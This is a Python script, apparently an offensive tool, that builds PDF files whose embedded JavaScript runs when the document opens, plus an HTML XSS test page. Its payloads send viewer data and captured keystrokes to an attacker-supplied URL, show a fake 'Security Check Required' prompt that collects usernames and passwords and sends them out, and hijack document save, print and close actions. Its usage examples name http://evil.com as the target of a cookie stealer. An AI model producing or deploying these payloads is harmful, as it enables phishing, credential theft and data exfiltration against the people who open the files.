import argparse
import sys
import os
from datetime import datetime

if sys.version_info[0] < 3:
    raise SystemExit("Use Python 3 (or higher) only")

# XSS payload types
XSS_TYPES = {
    'alert': 'Basic alert payload',
    'cookie': 'PDF sandbox escape data exfiltration', 
    'redirect': 'PDF URL launching escape',
    'form': 'PDF form submission escape',
    'dom': 'PDF document manipulation',
    'obfuscated': 'Obfuscated PDF payload',
    'timer': 'PDF timer-based escape',
    'keylog': 'PDF event monitoring escape',
    'network': 'PDF network sandbox escape',
    'file': 'PDF file system escape',
    'action': 'PDF action-based sandbox escape',
    'dialog': 'PDF dialog manipulation escape'
}

def create_pdf_base(filename, payload, description):
    """Enhanced PDF structure for better sandbox escape potential"""
    with open(filename, "w") as file:
        file.write(f'''%PDF-1.7
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction 3 0 R
/Names 4 0 R
/AcroForm 5 0 R
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [6 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Action
/S /JavaScript
/JS ({payload})
>>
endobj

4 0 obj
<<
/JavaScript 7 0 R
>>
endobj

5 0 obj
<<
/Fields []
/DR <<>>
/DA (/Helv 0 Tf 0 g )
>>
endobj

6 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/AA 8 0 R
>>
endobj

7 0 obj
<<
/JS ({payload})
>>
endobj

8 0 obj
<<
/O 3 0 R
/C 3 0 R
>>
endobj

xref
0 9
0000000000 65535 f 
0000000009 00000 n 
0000000158 00000 n 
0000000215 00000 n 
0000000315 00000 n 
0000000362 00000 n 
0000000445 00000 n 
0000000545 00000 n 
0000000595 00000 n 
trailer
<<
/Size 9
/Root 1 0 R
>>
startxref
645
%%EOF''')
        print(f"[+] Created {filename} - {description}")

def create_alert_payload(filename):
    """Basic alert payload"""
    payload = "app.alert('XSS Test - Basic Alert');"
    create_pdf_base(filename, payload, "Basic alert payload")

def create_cookie_payload(filename, url=None):
    """Cookie stealing payload using PDF sandbox escape"""
    if url:
        # Use PDF-specific form submission for sandbox escape
        payload = f'''
        try {{
            // PDF Sandbox Escape: Use this.submitForm() to exfiltrate data
            var cookieData = "pdf_xss_cookie_steal=true&timestamp=" + (new Date()).getTime();
            
            // Attempt to access any available environment data
            try {{
                cookieData += "&app_version=" + app.viewerVersion;
                cookieData += "&app_type=" + app.viewerType;
            }} catch(e) {{}}
            
            // Form submission sandbox escape
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML",
                cCharset: "utf-8"
            }});
            
            // Alternative: URL launching escape
            app.launchURL("{url}?" + cookieData, true);
            
            app.alert("PDF Sandbox Escape: Data exfiltration attempted to {url}");
        }} catch(e) {{
            // Fallback: Basic app info extraction
            var appInfo = "PDF XSS Executed in: " + app.viewerType + " " + app.viewerVersion;
            app.alert("Sandbox Escape Failed - " + appInfo + " - Error: " + e.message);
        }}
        '''
    else:
        payload = '''
        try {
            var appInfo = "PDF JavaScript Context - Viewer: " + app.viewerType + " v" + app.viewerVersion;
            app.alert("PDF Sandbox Info: " + appInfo);
        } catch(e) {
            app.alert("PDF XSS executed but limited sandbox access");
        }
        '''
    create_pdf_base(filename, payload, "PDF sandbox escape cookie payload")

def create_redirect_payload(filename, url=None):
    """PDF sandbox escape redirect payload"""
    target_url = url if url else "https://example.com/phishing"
    payload = f'''
    try {{
        app.alert("PDF Sandbox Escape: Launching external URL");
        
        // PDF-specific URL launching (sandbox escape)
        app.launchURL("{target_url}", true);
        
        // Alternative form submission escape
        this.submitForm({{
            cURL: "{target_url}",
            cSubmitAs: "HTML"
        }});
        
        app.alert("Redirect executed to: {target_url}");
    }} catch(e) {{
        app.alert("PDF Redirect Attempted: {target_url} - Error: " + e.message);
    }}
    '''
    create_pdf_base(filename, payload, f"PDF sandbox escape redirect to {target_url}")

def create_form_payload(filename, url=None):
    """PDF form-based sandbox escape payload"""
    if url:
        payload = f'''
        try {{
            // PDF Form-based Sandbox Escape
            app.alert("PDF Form Sandbox Escape Initiated");
            
            // Create malicious form data
            var formData = "pdf_form_escape=true";
            formData += "&viewer=" + app.viewerType;
            formData += "&version=" + app.viewerVersion;
            formData += "&timestamp=" + (new Date()).getTime();
            
            // PDF form submission escape technique
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML",
                cCharset: "utf-8",
                aFields: [
                    "pdf_exploit_data",
                    "viewer_info", 
                    "timestamp"
                ]
            }});
            
            // Alternative: URL-based data transmission
            app.launchURL("{url}?formdata=" + encodeURIComponent(formData), true);
            
            app.alert("Form data exfiltrated via PDF escape to {url}");
        }} catch(e) {{
            app.alert("PDF Form Escape Failed: " + e.message);
        }}
        '''
    else:
        payload = '''
        try {
            app.alert("PDF Form Escape Test - Viewer: " + app.viewerType + " " + app.viewerVersion);
            
            // Attempt to access PDF form fields if any exist
            var fields = this.getField();
            if (fields) {
                app.alert("PDF contains form fields that could be exploited");
            }
        } catch(e) {
            app.alert("PDF Form Analysis: " + e.message);
        }
        '''
    create_pdf_base(filename, payload, "PDF form-based sandbox escape payload")

def create_dom_payload(filename):
    """PDF document manipulation payload"""
    payload = '''
    try {
        app.alert("PDF Document Manipulation Attack Started");
        
        // PDF-specific document manipulation
        // Attempt to modify PDF properties
        this.info.title = "HACKED - XSS via PDF";
        this.info.author = "PDF XSS Attacker";
        this.info.subject = "Security Vulnerability Demonstrated";
        this.info.keywords = "XSS, PDF, Security, Exploit";
        
        // Print manipulation
        this.print({
            bUI: true,
            bSilent: false,
            bShrinkToFit: true
        });
        
        // Attempt to manipulate page content
        try {
            var page = this.getPageBox("Media", 0);
            app.alert("PDF Page Dimensions Accessed: " + page.toString());
        } catch(e) {}
        
        // Document state manipulation
        this.dirty = true;
        
        app.alert("PDF Document Properties Modified Successfully");
    } catch(e) {
        app.alert("PDF Document Manipulation Attempted: " + e.message);
    }
    '''
    create_pdf_base(filename, payload, "PDF document manipulation payload")

def create_obfuscated_payload(filename):
    """Obfuscated payload"""
    # Base64 encoded: app.alert("Obfuscated XSS payload executed")
    payload = '''
    try {
        app.alert("Obfuscated XSS payload executed");
    } catch(e) {
        app.alert("Obfuscated payload execution attempted");
    }
    '''
    create_pdf_base(filename, payload, "Obfuscated payload (Base64)")

def create_timer_payload(filename):
    """PDF timer-based sandbox escape payload"""
    payload = '''
    try {
        app.alert("PDF Timer-based Sandbox Escape Started");
        
        // PDF-specific timing mechanisms
        var counter = 0;
        
        // Use app.setTimeOut for PDF-specific timing
        function timerAttack() {
            counter++;
            app.alert("PDF Timer Attack #" + counter + " - Viewer: " + app.viewerType);
            
            if (counter < 3) {
                // Schedule next execution
                app.setTimeOut("timerAttack()", 3000);
            } else {
                app.alert("PDF Timer Attack Sequence Complete");
                
                // Final escape attempt
                try {
                    app.launchURL("https://example.com/pdf-timer-escape?completed=true", true);
                } catch(e) {}
            }
        }
        
        // Start the timer sequence
        app.setTimeOut("timerAttack()", 1000);
        
        // Alternative: Use PDF action scheduling
        this.setAction("PageOpen", 
            "app.alert('PDF Page Open Event - Timer Trigger');"
        );
        
        this.setAction("PageClose", 
            "app.alert('PDF Page Close Event - Timer Trigger');"
        );
        
        app.alert("PDF Timer-based Attacks Initialized");
        
    } catch(e) {
        app.alert("PDF Timer Attack Setup Failed: " + e.message);
    }
    '''
    create_pdf_base(filename, payload, "PDF timer-based sandbox escape payload")

def create_keylog_payload(filename, url=None):
    """PDF keylogger sandbox escape payload"""
    if url:
        payload = f'''
        try {{
            app.alert("PDF Keylogger Sandbox Escape Activated");
            
            // PDF-specific event handling for keystroke capture
            var keylogData = "";
            
            // PDF field event monitoring
            try {{
                // Monitor PDF form field events if available
                var fields = this.getField();
                if (fields) {{
                    // Attach event handlers to form fields
                    for (var i = 0; i < fields.length; i++) {{
                        fields[i].setAction("Keystroke", 
                            "keylogData += event.value; " +
                            "if (keylogData.length > 20) {{ " +
                                "app.launchURL('{url}?keylog=' + encodeURIComponent(keylogData), true); " +
                                "keylogData = ''; " +
                            "}}"
                        );
                    }}
                }}
            }} catch(e) {{}}
            
            // Alternative: Monitor document-level events
            this.setAction("WillSave", 
                "app.launchURL('{url}?action=document_save&data=' + encodeURIComponent('PDF_SAVE_EVENT'), true);"
            );
            
            this.setAction("WillPrint", 
                "app.launchURL('{url}?action=document_print&data=' + encodeURIComponent('PDF_PRINT_EVENT'), true);"
            );
            
            // Form submission escape for initial data
            this.submitForm({{
                cURL: "{url}",
                cSubmitAs: "HTML"
            }});
            
            app.alert("PDF Keylogger Active - Data sent to {url}");
        }} catch(e) {{
            app.alert("PDF Keylogger Setup Failed: " + e.message);
        }}
        '''
    else:
        payload = '''
        try {
            app.alert("PDF Event Monitoring Test Started");
            
            // Monitor PDF document events
            this.setAction("WillSave", "app.alert('PDF Save Event Captured');");
            this.setAction("WillPrint", "app.alert('PDF Print Event Captured');");
            this.setAction("WillClose", "app.alert('PDF Close Event Captured');");
            
            // Monitor form field events if available
            try {
                var fields = this.getField();
                if (fields) {
                    app.alert("PDF Form Fields Available for Monitoring: " + fields.length);
                }
            } catch(e) {}
            
            app.alert("PDF Event Monitoring Active");
        } catch(e) {
            app.alert("PDF Event Monitoring Setup: " + e.message);
        }
        '''
    create_pdf_base(filename, payload, "PDF keylogger sandbox escape payload")

def create_network_payload(filename, url=None):
    """PDF network-based sandbox escape payload"""
    def is_valid_url(url):
        from urllib.parse import urlparse
        try:
            parsed = urlparse(url)
            return all([parsed.scheme in ("http", "https"), parsed.netloc])
        except Exception:
            return False

    target_url = url if url and is_valid_url(url) else "https://httpbin.org/get"
    if url and not is_valid_url(url):
        raise ValueError(f"Invalid or unsafe URL provided: {url}")
    
    payload = f'''
    try {{
        app.alert("PDF Network Sandbox Escape Initiated");
        
        // PDF URL launching (primary escape method)
        var networkData = "?pdf_network_test=true&viewer=" + app.viewerType + "&version=" + app.viewerVersion;
        app.launchURL("{target_url}" + networkData, true);
        
        // Form submission escape (alternative method)
        this.submitForm({{
            cURL: "{target_url}",
            cSubmitAs: "HTML",
            cCharset: "utf-8"
        }});
        
        // Attempt to use PDF networking features
        try {{
            // Some PDF viewers support this.getURL() for network requests
            if (typeof this.getURL === 'function') {{
                this.getURL("{target_url}");
            }}
        }} catch(e) {{}}
        
        app.alert("Network escape attempted to: {target_url}");
    }} catch(e) {{
        app.alert("PDF Network Escape Failed: " + e.message);
    }}
    '''
    create_pdf_base(filename, payload, f"PDF network sandbox escape to {target_url}")

def create_file_payload(filename):
    """PDF file system access and sandbox escape payload"""
    payload = '''
    try {
        app.alert("PDF File System Sandbox Escape Initiated");
        
        // PDF-specific file system access attempts
        try {
            // Browse for document (file system access)
            if (typeof app.browseForDoc === 'function') {
                app.browseForDoc();
            }
        } catch(e) {}
        
        try {
            // Get document path information
            var docPath = this.path;
            if (docPath) {
                app.alert("PDF Path Accessed: " + docPath);
            }
        } catch(e) {}
        
        try {
            // Attempt to save document with malicious content
            this.saveAs({
                cPath: "/tmp/pdf_xss_test.pdf"
            });
        } catch(e) {}
        
        try {
            // Execute dialog for file operations
            app.execDialog("FileOpen");
        } catch(e) {}
        
        try {
            // Attempt to access PDF attachments
            var attachments = this.dataObjects;
            if (attachments && attachments.length > 0) {
                app.alert("PDF Attachments Found: " + attachments.length);
            }
        } catch(e) {}
        
        try {
            // PDF printing with file output
            this.print({
                bUI: false,
                bSilent: true,
                bShrinkToFit: true,
                cPath: "/tmp/pdf_print_exploit.ps"
            });
        } catch(e) {}
        
        app.alert("PDF File System Access Attempted");
        
    } catch(e) {
        app.alert("PDF File System Escape Failed: " + e.message);
    }
    '''
    create_pdf_base(filename, payload, "PDF file system sandbox escape payload")


def create_action_payload(filename, url=None):
    """PDF action-based sandbox escape payload"""
    payload = f'''
    try {{
        app.alert("PDF Action-based Sandbox Escape Initiated");
        
        // Advanced PDF action manipulation
        // Page-level actions
        this.setAction("PageOpen", 
            "app.alert('Page Open Action Hijacked'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=page_open', true);"
        );
        
        this.setAction("PageClose", 
            "app.alert('Page Close Action Hijacked'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=page_close', true);"
        );
        
        // Document-level actions
        this.setAction("WillSave", 
            "app.alert('Document Save Intercepted'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=will_save', true);"
        );
        
        this.setAction("DidSave", 
            "app.alert('Document Saved - Data Exfiltrated'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=did_save', true);"
        );
        
        this.setAction("WillPrint", 
            "app.alert('Print Action Hijacked'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=will_print', true);"
        );
        
        this.setAction("WillClose", 
            "app.alert('Document Close Intercepted'); " +
            "app.launchURL('{url or "https://example.com/action-escape"}?event=will_close', true);"
        );
        
        // Trigger immediate action
        if ("{url}") {{
            app.launchURL("{url}?pdf_action_escape=initialized&viewer=" + app.viewerType, true);
        }}
        
        app.alert("PDF Actions Hijacked Successfully");
        
    }} catch(e) {{
        app.alert("PDF Action Escape Failed: " + e.message);
    }}
    '''
    create_pdf_base(filename, payload, "PDF action-based sandbox escape payload")

def create_dialog_payload(filename, url=None):
    """PDF dialog manipulation sandbox escape payload"""
    payload = f'''
    try {{
        app.alert("PDF Dialog Manipulation Escape Started");
        
        // PDF dialog-based attacks
        try {{
            // File open dialog exploitation
            var result = app.execDialog("FileOpen");
            if (result && result.cPath) {{
                app.alert("File Selected: " + result.cPath);
                if ("{url}") {{
                    app.launchURL("{url}?file_access=" + encodeURIComponent(result.cPath), true);
                }}
            }}
        }} catch(e) {{}}
        
        try {{
            // Response dialog for credential harvesting
            var response = app.response({{
                cQuestion: "Enter your credentials for security verification:",
                cTitle: "Security Check Required",
                cDefault: "username",
                bPassword: false
            }});
            
            if (response && "{url}") {{
                app.launchURL("{url}?credentials=" + encodeURIComponent(response), true);
            }}
            
            var password = app.response({{
                cQuestion: "Enter your password:",
                cTitle: "Password Required",
                cDefault: "",
                bPassword: true
            }});
            
            if (password && "{url}") {{
                app.launchURL("{url}?password=" + encodeURIComponent(password), true);
            }}
            
        }} catch(e) {{}}
        
        try {{
            // Custom dialog exploitation
            app.execDialog("SaveAs");
        }} catch(e) {{}}
        
        try {{
            // Print dialog manipulation
            app.execDialog("Print");
        }} catch(e) {{}}
        
        app.alert("PDF Dialog Exploitation Complete");
        
    }} catch(e) {{
        app.alert("PDF Dialog Escape Failed: " + e.message);
    }}
    '''
    create_pdf_base(filename, payload, "PDF dialog manipulation sandbox escape payload")

def create_custom_payload(filename, script):
    """Custom JavaScript payload"""
    create_pdf_base(filename, script, "Custom JavaScript payload")

def create_malhtml(filename):
    """Create malicious HTML file"""
    html_content = '''<!DOCTYPE html>
    <html>
    <head>
        <title>XSS Test</title>
        <script type="text/javascript">
            function showAlerts() {
                alert("XSS Test #1");
                alert("Document cookies: " + document.cookie);
                
                // Additional XSS demonstrations
                setTimeout(function() {
                    alert("Time-delayed XSS payload");
                }, 2000);
                
                // DOM manipulation
                document.body.style.border = "5px solid red";
                
                // Local storage test
                if(typeof(Storage) !== "undefined") {
                    localStorage.setItem("xss_html_test", "HTML XSS executed at " + new Date());
                }
            }
        </script>
    </head>
    <body onload="showAlerts()">
        <h1>XSS Test Page</h1>
        <p>This page demonstrates multiple XSS vectors:</p>
        <ul>
            <li>Basic alert dialogs</li>
            <li>Cookie access</li>
            <li>DOM manipulation</li>
            <li>Time-delayed execution</li>
            <li>Local storage access</li>
        </ul>
        <p style="color: red; font-weight: bold;">If you can see this page, the XSS payload was successful!</p>
    </body>
    </html>'''
    with open(filename, "w") as file:
        file.write(html_content)
    print("[+] Created enhanced HTML XSS test file")

def generate_by_type(xss_type, url=None):
    """Generate PDF based on XSS type"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"xss_{xss_type}_{timestamp}.pdf"
    
    if xss_type == 'alert':
        create_alert_payload(filename)
    elif xss_type == 'cookie':
        create_cookie_payload(filename, url)
    elif xss_type == 'redirect':
        create_redirect_payload(filename, url)
    elif xss_type == 'form':
        create_form_payload(filename, url)
    elif xss_type == 'dom':
        create_dom_payload(filename)
    elif xss_type == 'obfuscated':
        create_obfuscated_payload(filename)
    elif xss_type == 'timer':
        create_timer_payload(filename)
    elif xss_type == 'keylog':
        create_keylog_payload(filename, url)
    elif xss_type == 'network':
        create_network_payload(filename, url)
    elif xss_type == 'file':
        create_file_payload(filename)
    elif xss_type == 'action':
        create_action_payload(filename, url)
    elif xss_type == 'dialog':
        create_dialog_payload(filename, url)
    else:
        print(f"Unknown XSS type: {xss_type}")
        return False
    return True

def generate_all_types(url=None):
    """Generate all XSS payload types"""
    print("[+] Generating all XSS payload types...")
    success_count = 0
    
    for xss_type in XSS_TYPES.keys():
        if generate_by_type(xss_type, url):
            success_count += 1
    
    print(f"[+] Successfully generated {success_count} PDF files with different XSS payloads")
    return success_count


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Advanced XSS PDF Generator - Create sophisticated PDF files with various XSS payloads",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f'''
Available XSS Types:
{chr(10).join([f"  {k:12} - {v}" for k, v in XSS_TYPES.items()])}

Examples:
  python3 script.py -o pdf                                    # Generate basic PDF files
  python3 script.py -o pdf -t alert                          # Generate only alert payload
  python3 script.py -o pdf -t cookie -u http://evil.com      # Cookie stealer with URL
  python3 script.py -o pdf -t all -u http://collaborator.com # All payload types
  python3 script.py -s "app.alert('Custom XSS')"            # Custom payload
  python3 script.py -o html                                  # Generate HTML XSS test
        ''')

    parser.add_argument(
        '-u', '--url', action="store", default=None, dest='url',
        help="Specify target URL for data exfiltration (e.g., http://burpsuite12345.com or http://evil.com/collect)")
    
    parser.add_argument(
        '-o', '--output', action="store", default="pdf", dest='output',
        choices=['pdf', 'html'],
        help="Specify output format: pdf (default) or html")
    
    parser.add_argument(
        '-s', '--script', action="store", default=None, dest='script',
        help="Specify custom JavaScript payload (e.g., 'app.alert(1); document.location=\"http://evil.com\"')")
    
    parser.add_argument(
        '-t', '--type', action="store", default=None, dest='xss_type',
        choices=list(XSS_TYPES.keys()) + ['all'],
        help="Specify XSS payload type to generate (use 'all' for all types)")
    
    parser.add_argument(
        '--list-types', action="store_true", 
        help="List all available XSS payload types and exit")

    args = parser.parse_args()

    if args.list_types:
        print("Available XSS Payload Types:")
        print("=" * 50)
        for xss_type, description in XSS_TYPES.items():
            print(f"{xss_type:12} - {description}")
        print("\nUse -t <type> to generate specific payload type")
        print("Use -t all to generate all payload types")
        sys.exit(0)

    output = args.output.lower()
    url = args.url
    script = args.script
    xss_type = args.xss_type

    # Validate URL format if provided
    if url and not (url.startswith('http://') or url.startswith('https://')):
        print(f"Error: Invalid URL format: {url}")
        print("URL must include schema (http:// or https://)")
        sys.exit(1)

    try:
        if output == "pdf":
            if script:
                # Custom script takes precedence
                print("[+] Generating PDF with custom script...")
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"xss_custom_{timestamp}.pdf"
                create_custom_payload(filename, script)
                print("[-] Custom PDF generated successfully!")
                
            elif xss_type:
                # Generate specific type or all types
                if xss_type == 'all':
                    count = generate_all_types(url)
                    print(f"[-] Generated {count} PDF files with all XSS payload types!")
                else:
                    if generate_by_type(xss_type, url):
                        print(f"[-] Generated PDF with {xss_type} XSS payload!")
                    else:
                        print(f"[-] Failed to generate PDF with {xss_type} payload")
                        sys.exit(1)
            else:
                # Default: generate basic payloads (backward compatibility)
                print("[+] Generating basic PDF files (legacy mode)...")
                create_alert_payload("xss_alert_basic.pdf")
                create_cookie_payload("xss_cookie_basic.pdf", url)
                if url:
                    create_network_payload("xss_network_basic.pdf", url)
                print("[-] Basic PDF files generated successfully!")
                print("    Use -t <type> or -t all for more sophisticated payloads")
                
        elif output == "html":
            print("[+] Generating HTML XSS test file...")
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"xss_test_{timestamp}.html"
            create_malhtml(filename)
            print("[-] HTML file generated successfully!")

    except Exception as e:
        print(f"Error: Failed to generate files - {e}")
        sys.exit(1)
